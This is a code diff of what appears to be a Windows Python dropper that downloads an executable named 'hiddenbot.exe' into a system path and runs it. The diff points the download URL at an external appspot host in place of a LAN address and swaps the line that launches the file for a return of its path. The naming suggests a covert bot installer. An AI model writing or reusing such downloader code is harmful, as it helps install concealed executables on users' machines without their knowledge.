@@ -5,7 +5,7 @@ import win32api
 import win32con
 
 global chatboturl
-CHATBOTURL = "http://192.168.2.4:8080/hiddenbot.exe"
+CHATBOTURL = "http://littlesitetomakemoney.appspot.com/hiddenbot.exe"
 
 def download_install_run(url, specialpath, fname, duplicate=True):
     #Get a path for the file
@@ -25,7 +25,8 @@ def download_install_run(url, specialpath, fname, duplicate=True):
     
     #Make a command to run the file
     spath = win32api.GetShortPathName(path)
-    subprocess.Popen(spath)    
+    return spath
+    
         
 #Utility functions.  May be useful elsewhere
 def file_in_special_path(specialpath, fname):
